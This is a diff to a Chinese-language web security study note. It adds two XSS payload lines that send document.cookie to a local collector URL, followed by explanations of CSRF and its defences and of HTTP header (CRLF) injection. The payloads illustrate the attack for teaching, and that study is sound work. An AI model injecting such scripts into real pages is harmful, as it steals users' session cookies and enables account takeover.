@@ -564,6 +564,32 @@ XSS 攻击方式：
 
 [彻底弄懂XSS和CSRF](https://segmentfault.com/a/1190000023031910){link=static}
 
-[「 典型安全漏洞系列 」01.跨站脚本攻击XSS详解](https://mp.weixin.qq.com/s?__biz=MzkyMTYyOTQ5NA==&mid=2247483841&idx=1&sn=2a8416263b5c8b71dc13b0b0ebd9dc8b){link=static}
+```html
+<script>document.write(`<img width=0 height=0 src="http://localhost:4000/cookie?cookie=${document.cookie}"/>`)</script>
 
-[前端必知的跨站脚本攻击（XSS）示例与解决方案](https://mp.weixin.qq.com/s?__biz=MzAwOTUyNzI3Ng==&mid=2652074681&idx=1&sn=373eb3a159cc35e86130ea6afd638704){link=static}
+<script>document.body.appendChild(document.createElement("img").src = `http://localhost:4000/cookie?cookie=${document.cookie}`)</script>
+```
+
+### CSRF 跨站请求伪造
+
+攻击者通过各种方法伪造一个请求（如获取 cookie），模仿用户提交表单的行为，从而达到修改用保护数据，或执行特定任务的目的。
+
+CSRF 防御：
+
+- 禁止第三方网站携带本网站的 cookie 信息：设置 same-site 属性，有两个值，Strict（禁止本 cookie 作为第三方 cookie）和 Lax（a、link 和 from 的 get 请求可以）。
+
+- 验证 HTTP referer 字段，该字段记录了请求的来源地址。但由于是浏览器提供的，不够安全。
+
+- 添加 token 认证：服务器返回 token 后，保存在其它地方（不保存在 cookie），每次请求带上 token 验证身份。
+
+- 使用 post 请求，增加攻击成本。
+
+### HTTP HEADS 攻击
+
+HTTP 协议在 response header 和 content 之间，有一个空行，即两组 CRLF 字符。这个空行标识着 headers 的结束和 content 的开始。
+
+攻击者可以利用这一点，只有想办法将任意字符注入到 headers 中，该攻击就可以发生。
+
+例如在重定向时，将恶意代码拼接到 URL 中，从而将代码写入空行，实现攻击。
+
+防御：过滤 headers 中的非法字符。
